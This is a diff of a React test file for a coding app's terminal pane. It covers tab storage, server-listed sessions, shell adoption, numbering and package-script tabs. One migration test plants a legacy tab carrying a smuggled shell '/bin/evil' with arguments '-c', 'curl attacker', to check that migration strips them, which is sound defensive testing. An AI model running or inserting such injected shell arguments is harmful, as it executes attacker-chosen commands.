@@ -1,22 +1,121 @@
 /** @vitest-environment jsdom */
 
+import { randomUUID } from 'node:crypto';
+import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
 import {
   act,
+  cleanup,
   fireEvent,
   render,
   screen,
   waitFor,
+  within,
 } from '@testing-library/react';
+import type { ReactNode } from 'react';
 import { beforeEach, expect, test, vi } from 'vitest';
 import { CodingTerminalPane } from '../CodingTerminalPane';
 
-const { closeProjectTerminal, connections } = vi.hoisted(() => ({
-  closeProjectTerminal: vi.fn(),
-  /** What `useACPConnections` answers: the agent kinds, or not yet. */
-  connections: { data: [] as unknown[], isPending: false },
-}));
+const { closeProjectTerminal, connections, server, adopt, scripts } =
+  vi.hoisted(() => ({
+    closeProjectTerminal: vi.fn(),
+    /** The Project's package scripts, and the runner's run and restart. */
+    scripts: {
+      list: [] as { name: string; command: string }[],
+      run: vi.fn(),
+      restart: vi.fn(),
+    },
+    /**
+     * `POST …/terminal-sessions` with `adopt`: the binding's running shell, or
+     * a new one. `supported: false` is a host that predates it.
+     */
+    adopt: { supported: true, calls: 0 },
+    /** What `useACPConnections` answers: the agent kinds, or not yet. */
+    connections: { data: [] as unknown[], isPending: false },
+    /**
+     * The server's terminal sessions, as the store reaches them: `list` per
+     * Project binding (ended sessions stay listed), `open` adds one, `attach`
+     * views one.
+     */
+    server: {
+      records: [] as Record<string, unknown>[],
+      list: vi.fn(),
+      open: vi.fn(),
+      attach: vi.fn(),
+    },
+  }));
+const SHELL_ONE = '11111111-1111-4111-8111-111111111111';
+const AGENT_ONE = '22222222-2222-4222-8222-222222222222';
+let clock = 10;
+const running = (terminalId: string, extra: object = {}) => ({
+  terminalId,
+  projectId: 'project-a-id',
+  bindingKey: 'project',
+  status: 'running',
+  createdAt: 1,
+  ...extra,
+});
 
-vi.mock('@kontourai/station-sdk', () => ({ closeProjectTerminal }));
+vi.mock('@kontourai/station-sdk', () => ({
+  openOrAdoptProjectShell: async (_apiBase: string, slug: string) => {
+    adopt.calls += 1;
+    if (!adopt.supported) return null;
+    const projectId = `${slug}-id`;
+    const shells = server.records.filter(
+      (record) =>
+        record.projectId === projectId &&
+        (record.launch as { kind?: string } | undefined)?.kind !== 'agent',
+    );
+    const live = shells.find((record) => record.status === 'running');
+    if (live)
+      return {
+        terminalId: live.terminalId as string,
+        ordinal: live.ordinal as number,
+        adopted: true,
+      };
+    const terminalId = `adopted-${server.records.length + 1}`;
+    const ordinal =
+      Math.max(0, ...shells.map((record) => Number(record.ordinal ?? 0))) + 1;
+    server.records.push({
+      terminalId,
+      projectId,
+      bindingKey: 'project',
+      status: 'running',
+      createdAt: ++clock,
+      launch: { kind: 'shell' },
+      ordinal,
+    });
+    return { terminalId, ordinal, adopted: false };
+  },
+  listProjectTerminalScripts: async () => ({
+    packageManager: 'npm',
+    scripts: scripts.list,
+  }),
+  // A script runs as a command session the list keeps after it ends.
+  runProjectTerminalScript: async (
+    _apiBase: string,
+    slug: string,
+    name: string,
+  ) => {
+    const terminalId = await scripts.run(slug, name);
+    server.records.push({
+      terminalId,
+      projectId: `${slug}-id`,
+      bindingKey: 'project',
+      status: 'running',
+      createdAt: ++clock,
+      kind: 'command',
+      launch: { kind: 'script', name },
+    });
+    return { terminalId };
+  },
+  // The service ends the session; the list keeps it, ended.
+  closeProjectTerminal: async (...args: [string, string, string]) => {
+    const result = await closeProjectTerminal(...args);
+    for (const record of server.records)
+      if (record.terminalId === args[2]) record.status = 'exited';
+    return result;
+  },
+}));
 vi.mock('../../../contexts/ApiBaseContext', () => ({
   useApiBase: () => ({ apiBase: 'http://station.test' }),
 }));
@@ -28,24 +127,133 @@ vi.mock('../../acp-connections/ACPChatPanel', () => ({
     <div>Agent chat remains detached from terminal renderer</div>
   ),
 }));
-vi.mock('../TerminalPanel', () => ({
-  TerminalPanel: () => <div>Terminal renderer without a snapshot</div>,
+// The renderer's session seam, as `TerminalPanel` drives it: a tab naming a
+// session attaches to it; a tab without one opens a new one and reports it.
+vi.mock('../TerminalPanel', async () => {
+  const { useEffect } = await import('react');
+  return {
+    TerminalPanel: ({
+      terminalId,
+      target,
+      launch,
+      onOpened,
+      viewKey,
+      ended,
+      onRestarted,
+    }: {
+      terminalId?: string;
+      target?: { projectId: string; bindingKey: string };
+      launch?: unknown;
+      onOpened?: (terminalId: string) => void;
+      viewKey?: string;
+      ended?: { message: string };
+      onRestarted?: () => void;
+    }) => {
+      const projectId = target?.projectId;
+      useEffect(() => {
+        if (!projectId) return;
+        if (terminalId) {
+          server.attach(terminalId);
+          return;
+        }
+        let live = true;
+        void Promise.resolve(server.open({ projectId }, launch)).then(
+          (opened: string) => {
+            if (live) onOpened?.(opened);
+          },
+        );
+        return () => {
+          live = false;
+        };
+        // Like the real view: a new view key is a new view of the session.
+      }, [projectId, viewKey]);
+      return (
+        <div>
+          Terminal renderer without a snapshot
+          {/* The real view offers this once the program has ended. */}
+          {ended && terminalId ? (
+            <button
+              type="button"
+              onClick={async () => {
+                // The view restarts its own session, as the real one does.
+                await scripts.restart(terminalId);
+                for (const record of server.records)
+                  if (record.terminalId === terminalId) {
+                    record.status = 'running';
+                    delete record.exitCode;
+                  }
+                onRestarted?.();
+              }}
+            >
+              Restart
+            </button>
+          ) : null}
+        </div>
+      );
+    },
+  };
+});
+vi.mock('../../../contexts/ProjectsContext', () => ({
+  useProject: (slug: string) => ({ project: { id: `${slug}-id` } }),
+}));
+vi.mock('../terminalSessionStore', () => ({
+  useTerminalSessionStore: () => server,
 }));
 
+let queryClient: QueryClient;
+const wrapper = ({ children }: { children: ReactNode }) => (
+  <QueryClientProvider client={queryClient}>{children}</QueryClientProvider>
+);
+const renderInPage = (ui: React.ReactElement) => render(ui, { wrapper });
+
 beforeEach(() => {
+  queryClient = new QueryClient({
+    defaultOptions: { queries: { retry: false } },
+  });
   closeProjectTerminal.mockReset();
   sessionStorage.clear();
   connections.data = [];
   connections.isPending = false;
+  server.records = [];
+  scripts.list = [];
+  scripts.run.mockReset();
+  scripts.restart.mockReset();
+  adopt.supported = true;
+  adopt.calls = 0;
+  server.list
+    .mockReset()
+    .mockImplementation(async (target: { projectId: string }) =>
+      server.records
+        .filter((record) => record.projectId === target.projectId)
+        .map((record) => ({ ...record })),
+    );
+  server.attach.mockReset();
+  server.open
+    .mockReset()
+    .mockImplementation(async (target: { projectId: string }, launch) => {
+      const terminalId = randomUUID();
+      server.records.push({
+        terminalId,
+        projectId: target.projectId,
+        bindingKey: 'project',
+        status: 'running',
+        createdAt: ++clock,
+        launch: launch ?? { kind: 'shell' },
+      });
+      return terminalId;
+    });
 });
 
 function renderPane(tabs: unknown[]) {
-  sessionStorage.setItem('coding-terminal-tabs', JSON.stringify(tabs));
   sessionStorage.setItem(
-    'coding-terminal-active-tab',
+    'coding-terminal-tabs:v2:project-a',
+    JSON.stringify(tabs),
+  );
+  sessionStorage.setItem(
+    'coding-terminal-active-tab:v2:project-a',
     (tabs[0] as any)?.id ?? '',
   );
-  return render(
+  return renderInPage(
     <CodingTerminalPane
       presentation="pane"
       projectSlug="project-a"
@@ -61,14 +269,23 @@ test('keeps a terminal tab until project-bound close succeeds before any rendere
       resolveClose = resolve;
     }),
   );
-  renderPane([{ id: 'terminal-one', type: 'shell', label: 'Shell 1' }]);
+  server.records = [running(SHELL_ONE)];
+  renderPane([
+    {
+      id: 'terminal-one',
+      type: 'shell',
+      label: 'Shell 1',
+      terminalId: SHELL_ONE,
+    },
+  ]);
+  await screen.findByRole('tab', { name: 'Shell 1' });
 
   fireEvent.click(screen.getByRole('button', { name: 'Close Shell 1' }));
 
   expect(closeProjectTerminal).toHaveBeenCalledWith(
     'http://station.test',
     'project-a',
-    'terminal-one',
+    SHELL_ONE,
   );
   expect(screen.getByRole('tab', { name: 'Shell 1' })).toBeTruthy();
   expect(
@@ -96,6 +313,11 @@ test('terminates an agent terminal after its chat view detached and exposes a re
       projectSlug: 'project-a',
       terminalId: 'agent-one',
     });
+  server.records = [
+    running(AGENT_ONE, {
+      launch: { kind: 'agent', connectionId: 'alpha', mode: 'code' },
+    }),
+  ];
   renderPane([
     {
       id: 'agent-one',
@@ -103,8 +325,10 @@ test('terminates an agent terminal after its chat view detached and exposes a re
       label: 'Agent: alpha',
       agentSlug: 'alpha',
       mode: 'chat',
+      terminalId: AGENT_ONE,
     },
   ]);
+  await screen.findByRole('tab', { name: 'Agent: alpha' });
 
   expect(
     screen.getByText('Agent chat remains detached from terminal renderer'),
@@ -126,13 +350,13 @@ test('terminates an agent terminal after its chat view detached and exposes a re
     1,
     'http://station.test',
     'project-a',
-    'agent-one',
+    AGENT_ONE,
   );
   expect(closeProjectTerminal).toHaveBeenNthCalledWith(
     2,
     'http://station.test',
     'project-a',
-    'agent-one',
+    AGENT_ONE,
   );
 });
 
@@ -156,9 +380,9 @@ test('an open, empty terminal opens a shell when the shell is the only kind; "+"
 test('with an agent kind as well, nothing opens by itself and "+" is the picker', async () => {
   connections.data = [agentConnection];
   renderPane([]);
-  await act(async () => undefined);
+  const empty = await screen.findByRole('button', { name: '+ New Terminal' });
   expect(screen.queryByRole('tab')).toBeNull();
-  fireEvent.click(screen.getByRole('button', { name: '+ New Terminal' }));
+  fireEvent.click(empty);
   expect(screen.getByRole('dialog', { name: 'New terminal' })).toBeTruthy();
 });
 
@@ -179,7 +403,7 @@ test('while the kinds are still unknown nothing opens by itself, and a shell fol
 });
 
 test('a terminal closed in the Coding layout stays closed: the shell opens only once the panel is open', async () => {
-  const view = render(
+  const view = renderInPage(
     <CodingTerminalPane
       presentation="layout"
       terminalOpen={false}
@@ -209,6 +433,7 @@ test('closing the last terminal is remembered: a remount opens no shell, and ope
   const first = renderPane([
     { id: 'terminal-one', type: 'shell', label: 'Shell 1' },
   ]);
+  await waitFor(() => expect(server.list).toHaveBeenCalled());
   fireEvent.click(screen.getByRole('button', { name: 'Close Shell 1' }));
   await waitFor(() => expect(screen.queryByRole('tab')).toBeNull());
   // No shell opens in the empty panel the reader just emptied.
@@ -216,7 +441,7 @@ test('closing the last terminal is remembered: a remount opens no shell, and ope
   expect(screen.queryByRole('tab')).toBeNull();
   first.unmount();
   // A remount (a reload, a fold crossing): still none.
-  const second = render(
+  const second = renderInPage(
     <CodingTerminalPane
       presentation="pane"
       projectSlug="project-a"
@@ -226,11 +451,14 @@ test('closing the last terminal is remembered: a remount opens no shell, and ope
   await act(async () => undefined);
   expect(screen.queryByRole('tab')).toBeNull();
   fireEvent.click(screen.getByRole('button', { name: '+ New Terminal' }));
-  expect(screen.getByRole('tab', { name: 'Shell 1' })).toBeTruthy();
+  // The binding's second shell, though the first has ended.
+  expect(screen.getByRole('tab', { name: 'Shell 2' })).toBeTruthy();
   second.unmount();
-  // Opened again by hand: a later empty remount opens one as before.
-  sessionStorage.setItem('coding-terminal-tabs', '[]');
-  render(
+  // Opened again by hand: a later remount with nothing running opens one as
+  // before.
+  sessionStorage.setItem('coding-terminal-tabs:v2:project-a', '[]');
+  server.records = [];
+  renderInPage(
     <CodingTerminalPane
       presentation="pane"
       projectSlug="project-a"
@@ -249,13 +477,19 @@ test('closing the last terminal is remembered per Project: another Project’s e
   const inA = renderPane([
     { id: 'terminal-one', type: 'shell', label: 'Shell 1' },
   ]);
+  await waitFor(() => expect(server.list).toHaveBeenCalled());
   fireEvent.click(screen.getByRole('button', { name: 'Close Shell 1' }));
   await waitFor(() => expect(screen.queryByRole('tab')).toBeNull());
   inA.unmount();
-  // Project B, with the (browser-tab-wide) tab list empty: its panel was
-  // never emptied by the reader, so it opens a shell.
-  expect(sessionStorage.getItem('coding-terminal-tabs')).toBe('[]');
-  const inB = render(
+  // Project B keeps its own tab list: its panel was never emptied by the
+  // reader, so it opens a shell.
+  expect(sessionStorage.getItem('coding-terminal-tabs:v2:project-a')).toBe(
+    '[]',
+  );
+  expect(
+    sessionStorage.getItem('coding-terminal-tabs:v2:project-b'),
+  ).toBeNull();
+  const inB = renderInPage(
     <CodingTerminalPane
       presentation="pane"
       projectSlug="project-b"
@@ -265,8 +499,7 @@ test('closing the last terminal is remembered per Project: another Project’s e
   expect(await screen.findByRole('tab', { name: 'Shell 1' })).toBeTruthy();
   inB.unmount();
   // Back in Project A with an empty list: still the reader's closed panel.
-  sessionStorage.setItem('coding-terminal-tabs', '[]');
-  render(
+  renderInPage(
     <CodingTerminalPane
       presentation="pane"
       projectSlug="project-a"
@@ -275,4 +508,322 @@ test('closing the last terminal is remembered per Project: another Project’s e
   );
   await act(async () => undefined);
   expect(screen.queryByRole('tab')).toBeNull();
+});
+
+test('saved pre-socket tabs migrate once: labels kept, history named for import, programs dropped', async () => {
+  // Held open, so the migrated tabs stay this view's own while read.
+  server.open.mockImplementation(() => new Promise(() => undefined));
+  sessionStorage.setItem(
+    'coding-terminal-tabs',
+    JSON.stringify([
+      { id: 'term-1700000000000', type: 'shell', label: 'Build shell' },
+      {
+        id: 'term-1700000000001',
+        type: 'agent',
+        label: 'Agent: code',
+        agentSlug: 'alpha-code',
+        agentMode: 'code',
+        connectionId: 'alpha',
+        mode: 'terminal',
+        shell: '/bin/evil',
+        shellArgs: ['-c', 'curl attacker'],
+      },
+    ]),
+  );
+  sessionStorage.setItem('coding-terminal-active-tab', 'term-1700000000000');
+  renderInPage(
+    <CodingTerminalPane
+      presentation="pane"
+      projectSlug="project-a"
+      workingDir="/workspace"
+    />,
+  );
+  expect(await screen.findByRole('tab', { name: 'Build shell' })).toBeTruthy();
+  expect(sessionStorage.getItem('coding-terminal-tabs')).toBeNull();
+  expect(sessionStorage.getItem('coding-terminal-active-tab')).toBeNull();
+  const migrated = JSON.parse(
+    sessionStorage.getItem('coding-terminal-tabs:v2:project-a')!,
+  );
+  expect(migrated).toEqual([
+    {
+      id: 'term-1700000000000',
+      type: 'shell',
+      label: 'Build shell',
+      legacyTerminalId: 'term-1700000000000',
+    },
+    {
+      id: 'term-1700000000001',
+      type: 'agent',
+      label: 'Agent: code',
+      agentSlug: 'alpha-code',
+      agentMode: 'code',
+      connectionId: 'alpha',
+      mode: 'terminal',
+      legacyTerminalId: 'term-1700000000001',
+    },
+  ]);
+  // Read once: another Project never sees the old tabs.
+  cleanup();
+  renderInPage(
+    <CodingTerminalPane
+      presentation="pane"
+      projectSlug="project-b"
+      workingDir="/workspace-b"
+    />,
+  );
+  await act(async () => undefined);
+  expect(screen.queryByRole('tab', { name: 'Build shell' })).toBeNull();
+});
+
+test("the server list is the tab source: another device's session appears and a retired one goes", async () => {
+  server.records = [
+    running(AGENT_ONE, {
+      launch: { kind: 'agent', connectionId: 'alpha', mode: 'code' },
+    }),
+  ];
+  renderPane([
+    {
+      id: 'gone',
+      type: 'shell',
+      label: 'Retired shell',
+      terminalId: SHELL_ONE,
+    },
+  ]);
+  expect(await screen.findByRole('tab', { name: 'Agent: code' })).toBeTruthy();
+  expect(server.list).toHaveBeenCalledWith({
+    projectId: 'project-a-id',
+    bindingKey: 'project',
+  });
+  await waitFor(() =>
+    expect(screen.queryByRole('tab', { name: 'Retired shell' })).toBeNull(),
+  );
+});
+
+test('a second browser with empty storage adopts the running shell and opens none', async () => {
+  let answer: (records: unknown[]) => void = () => undefined;
+  server.list.mockImplementation(
+    () =>
+      new Promise((resolve) => {
+        answer = resolve;
+      }),
+  );
+  renderPane([]);
+  // Until the server says what this binding has, nothing opens.
+  await act(async () => undefined);
+  expect(screen.queryByRole('tab')).toBeNull();
+  expect(server.open).not.toHaveBeenCalled();
+
+  await act(async () => answer([running(SHELL_ONE)]));
+  expect(await screen.findByRole('tab', { name: 'Shell 1' })).toBeTruthy();
+  expect(server.attach).toHaveBeenCalledWith(SHELL_ONE);
+  expect(server.open).not.toHaveBeenCalled();
+});
+
+test('two views of one binding show one tab list, named alike; a close in one leaves the other', async () => {
+  closeProjectTerminal.mockResolvedValue({});
+  server.records = [
+    running(SHELL_ONE, { createdAt: 1 }),
+    running('33333333-3333-4333-8333-333333333333', { createdAt: 2 }),
+  ];
+  renderInPage(
+    <>
+      <section aria-label="Bottom">
+        <CodingTerminalPane
+          presentation="pane"
+          projectSlug="project-a"
+          workingDir="/workspace"
+        />
+      </section>
+      <section aria-label="Dock">
+        <CodingTerminalPane
+          presentation="pane"
+          projectSlug="project-a"
+          workingDir="/workspace"
+        />
+      </section>
+    </>,
+  );
+  const names = (region: string) =>
+    within(screen.getByRole('region', { name: region }))
+      .queryAllByRole('tab')
+      .map((tab) => tab.getAttribute('aria-label'));
+  await waitFor(() => expect(names('Bottom')).toEqual(['Shell 1', 'Shell 2']));
+  expect(names('Dock')).toEqual(['Shell 1', 'Shell 2']);
+
+  fireEvent.click(
+    within(screen.getByRole('region', { name: 'Dock' })).getByRole('button', {
+      name: 'Close Shell 1',
+    }),
+  );
+  await waitFor(() => expect(names('Bottom')).toEqual(['Shell 2']));
+  expect(names('Dock')).toEqual(['Shell 2']);
+  expect(server.open).not.toHaveBeenCalled();
+});
+
+test('"+" has a name and stays outside the scrolling tab strip', async () => {
+  server.records = [running(SHELL_ONE)];
+  renderPane([]);
+  await screen.findByRole('tab', { name: 'Shell 1' });
+  const add = screen.getByRole('button', { name: 'New terminal' });
+  expect(add.closest('[role="tablist"]')).toBeNull();
+});
+
+test('an empty binding opened by two views at once gets one shell, named by its stored number', async () => {
+  server.records = [
+    running('44444444-4444-4444-8444-444444444444', {
+      status: 'exited',
+      ordinal: 6,
+    }),
+  ];
+  renderInPage(
+    <>
+      <section aria-label="Bottom">
+        <CodingTerminalPane
+          presentation="pane"
+          projectSlug="project-a"
+          workingDir="/workspace"
+        />
+      </section>
+      <section aria-label="Dock">
+        <CodingTerminalPane
+          presentation="pane"
+          projectSlug="project-a"
+          workingDir="/workspace"
+        />
+      </section>
+    </>,
+  );
+  const names = (region: string) =>
+    within(screen.getByRole('region', { name: region }))
+      .queryAllByRole('tab')
+      .map((tab) => tab.getAttribute('aria-label'));
+  await waitFor(() => expect(names('Bottom')).toEqual(['Shell 7']));
+  await waitFor(() => expect(names('Dock')).toEqual(['Shell 7']));
+  expect(adopt.calls).toBe(2);
+  expect(server.open).not.toHaveBeenCalled();
+  expect(
+    server.records.filter((record) => record.status === 'running'),
+  ).toHaveLength(1);
+});
+
+test('shell names are the stored numbers, so evicting the oldest ended shells renames none', async () => {
+  // Shells 1 and 2 ended and were evicted; their numbers are not reused.
+  server.records = [
+    running(SHELL_ONE, { createdAt: 3, ordinal: 3 }),
+    running('33333333-3333-4333-8333-333333333333', {
+      createdAt: 4,
+      ordinal: 4,
+    }),
+  ];
+  renderPane([]);
+  await waitFor(() =>
+    expect(
+      screen.getAllByRole('tab').map((tab) => tab.getAttribute('aria-label')),
+    ).toEqual(['Shell 3', 'Shell 4']),
+  );
+  fireEvent.click(screen.getByTitle('New terminal'));
+  expect(screen.getByRole('tab', { name: 'Shell 5' })).toBeTruthy();
+});
+
+test('a host without the open-or-adopt answer opens the empty binding through the socket', async () => {
+  adopt.supported = false;
+  renderPane([]);
+  expect(await screen.findByRole('tab', { name: 'Shell 1' })).toBeTruthy();
+  await waitFor(() => expect(server.open).toHaveBeenCalledTimes(1));
+  expect(adopt.calls).toBe(1);
+});
+
+test('a package script runs from the "+" picker in its own tab, shows how it ended and restarts in place', async () => {
+  const SCRIPT = '33333333-3333-4333-8333-333333333333';
+  scripts.list = [{ name: 'test', command: 'vitest run' }];
+  scripts.run.mockResolvedValue(SCRIPT);
+  server.records = [running(SHELL_ONE, { ordinal: 1 })];
+  renderPane([]);
+  await screen.findByRole('tab', { name: 'Shell 1' });
+  // With scripts, "+" is the picker, and the script is listed by name.
+  await waitFor(() =>
+    expect(screen.getByRole('button', { name: 'New terminal' })).toBeTruthy(),
+  );
+  await act(async () => {
+    await queryClient.refetchQueries({ queryKey: ['coding-terminal-scripts'] });
+  });
+  fireEvent.click(screen.getByRole('button', { name: 'New terminal' }));
+  const picker = await screen.findByRole('dialog', { name: 'New terminal' });
+  expect(within(picker).getByText('Run a script')).toBeTruthy();
+  expect(within(picker).getByText('vitest run')).toBeTruthy();
+  fireEvent.click(within(picker).getByRole('button', { name: /test/ }));
+
+  expect(
+    await screen.findByRole('tab', { name: 'test, Running' }),
+  ).toBeTruthy();
+  expect(scripts.run).toHaveBeenCalledWith('project-a', 'test');
+  await waitFor(() => expect(server.attach).toHaveBeenCalledWith(SCRIPT));
+
+  // It ends: the tab stays, saying how.
+  const record = server.records.find((item) => item.terminalId === SCRIPT)!;
+  record.status = 'exited';
+  record.exitCode = 1;
+  expect(
+    await screen.findByRole(
+      'tab',
+      { name: 'test, Exit 1' },
+      { timeout: 5_000 },
+    ),
+  ).toBeTruthy();
+
+  // Restart runs it again in the same view of the same session, and the
+  // tab reads the new run from the server.
+  server.attach.mockClear();
+  fireEvent.click(screen.getByRole('button', { name: 'Restart' }));
+  await waitFor(() => expect(scripts.restart).toHaveBeenCalledWith(SCRIPT));
+  expect(server.attach).not.toHaveBeenCalled();
+  expect(
+    await screen.findByRole('tab', { name: 'test, Running' }),
+  ).toBeTruthy();
+});
+
+test('closing an ended script tab ends nothing on the server and hides it', async () => {
+  const SCRIPT = '44444444-4444-4444-8444-444444444444';
+  server.records = [
+    running(SHELL_ONE, { ordinal: 1 }),
+    {
+      ...running(SCRIPT, {
+        kind: 'command',
+        launch: { kind: 'script', name: 'lint' },
+      }),
+      status: 'exited',
+      exitCode: 0,
+    },
+  ];
+  renderPane([]);
+  await screen.findByRole('tab', { name: 'lint, Exit 0' });
+  fireEvent.click(screen.getByRole('button', { name: 'Close lint' }));
+  await waitFor(() =>
+    expect(screen.queryByRole('tab', { name: 'lint, Exit 0' })).toBeNull(),
+  );
+  expect(closeProjectTerminal).not.toHaveBeenCalled();
+  // The shells keep their names: a script is not a numbered shell.
+  expect(screen.getByRole('tab', { name: 'Shell 1' })).toBeTruthy();
+});
+
+test("a script's earlier ended runs do not pile up: only its newest run has a tab", async () => {
+  const script = (terminalId: string, createdAt: number, exitCode: number) => ({
+    ...running(terminalId, {
+      kind: 'command',
+      launch: { kind: 'script', name: 'check' },
+    }),
+    createdAt,
+    status: 'exited',
+    exitCode,
+  });
+  server.records = [
+    running(SHELL_ONE, { ordinal: 1 }),
+    script('55555555-5555-4555-8555-555555555555', 2, 3),
+    script('66666666-6666-4666-8666-666666666666', 3, 0),
+  ];
+  renderPane([]);
+  expect(
+    await screen.findByRole('tab', { name: 'check, Exit 0' }),
+  ).toBeTruthy();
+  expect(screen.queryByRole('tab', { name: 'check, Exit 3' })).toBeNull();
 });
